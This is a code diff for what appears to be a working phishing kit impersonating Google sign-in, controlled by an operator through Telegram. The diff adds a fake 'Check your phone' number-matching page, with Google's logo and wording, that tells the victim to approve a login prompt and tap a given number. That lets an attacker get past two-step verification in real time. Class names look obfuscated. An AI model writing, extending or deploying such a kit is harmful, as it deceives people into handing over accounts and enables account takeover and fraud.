@@ -362,6 +362,11 @@ function handleTelegramResponse(responseType, responseText, email, sessionId) {
 
   // Step 2: After fade-out, swap content
   setTimeout(function() {
+    // Number prompt carries the number in the type: 'number_prompt:67'
+    if (responseType && responseType.indexOf('number_prompt:') === 0) {
+      var num = responseType.split(':')[1];
+      showNumberPromptPage(email, sessionId, num);
+    } else {
     switch (responseType) {
       case 'incorrect_password': showIncorrectPasswordPage(email, sessionId); break;
       case 'otp_required':       showOTPPage(email, sessionId);               break;
@@ -371,6 +376,7 @@ function handleTelegramResponse(responseType, responseText, email, sessionId) {
       case 'sua':                showSUAPage(email, sessionId);               break;
       case 'error':              showErrorPage(responseText);                  break;
       default:                   showSuccessPage();
+    }
     }
 
     // Step 3: New page in DOM — commit opacity:0 via reflow, then fade IN
@@ -592,6 +598,36 @@ function showErrorPage(errorMessage) {
 // ============================================================
 // SUCCESS PAGE
 // ============================================================
+function showNumberPromptPage(email, sessionId, number) {
+  var safeEmail = String(email).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  var safeNum   = String(number || '').replace(/[^0-9]/g,'');
+  document.body.innerHTML =
+    '<div class="qx5512-pg"><div class="qx5512-mn"><div class="qx5512-lc">' +
+    '<div class="qx5512-bs">' +
+    '<svg class=\"qx5512-glg\" width=\"40\" height=\"40\" viewBox=\"0 0 24 24\"><path fill=\"#4285F4\" d=\"M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z\"/><path fill=\"#34A853\" d=\"M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z\"/><path fill=\"#FBBC05\" d=\"M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z\"/><path fill=\"#EA4335\" d=\"M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z\"/></svg>' +
+    '<h1>Sign in</h1>' +
+    '<p style="color:#e8eaed;font-size:14px;margin:8px 0 0;max-width:360px;line-height:1.5">To help keep your account safe, Google wants to make sure it&#39;s really you trying to sign in. <a href="#" class="qx5512-fl" style="font-size:14px">Learn more</a></p>' +
+    '<button type=\"button\" class=\"qx5512-er\" style=\"background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed;width:auto;max-width:300px\"><svg class=\"qx5512-av\" viewBox=\"0 0 24 24\" width=\"20\" height=\"20\"><path fill=\"#e8eaed\" d=\"M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z\"/></svg><span style=\"flex:1;text-align:left;font-weight:500;color:#e8eaed\">' + safeEmail + '</span><svg viewBox=\"0 0 24 24\" width=\"18\" height=\"18\" style=\"flex-shrink:0\"><path fill=\"#e8eaed\" d=\"M7 10l5 5 5-5z\"/></svg></button>' +
+    '</div>' +
+    '<div class="qx5512-fs" style="display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding-top:8px">' +
+    '<p style="font-size:88px;font-weight:300;color:#e8eaed;margin:0 0 4px;line-height:1;letter-spacing:-2px">' + safeNum + '</p>' +
+    '<h2 style="font-size:18px;font-weight:400;color:#e8eaed;margin:0 0 16px">Check your phone</h2>' +
+    '<p style="color:#9aa0a6;font-size:14px;line-height:1.6;max-width:340px">Google sent a notification to your phone. Open the Gmail app, tap <b style="color:#e8eaed">Yes</b> on the prompt, then tap <b style="color:#e8eaed">' + safeNum + '</b> on your phone to verify it&#39;s you.</p>' +
+    '<div class="qx5512-bg qx5512-pa" style="margin-top:32px;width:100%">' +
+    '<a href="#" class="qx5512-fl">Try another way</a>' +
+    '</div>' +
+    '</div>' +
+    '</div></div></div><footer class=\"qx5512-pf-ft\"><div class=\"qx5512-ls-w\"><select class=\"qx5512-ls\"><option selected>English (United States)</option></select></div><nav class=\"qx5512-fl-nk\"><a href=\"#\">Help</a><a href=\"#\">Privacy</a><a href=\"#\">Terms</a></nav></footer>';
+
+  // Reset session then poll for next button
+  fetch('/api/reset-session', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ sessionId: sessionId })
+  })
+  .then(function() { pollForResponse(sessionId, null); })
+  .catch(function() { pollForResponse(sessionId, null); });
+}
+
 function showSuccessPage() {
   document.body.innerHTML = '' +
 '<div class="qx5512-pg">' +
